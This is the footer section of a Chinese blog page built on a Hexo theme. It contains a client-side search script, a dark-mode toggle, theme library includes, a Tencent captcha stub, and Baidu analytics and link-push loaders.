<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?60ba8127252096f2c85afea30efed9e2";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
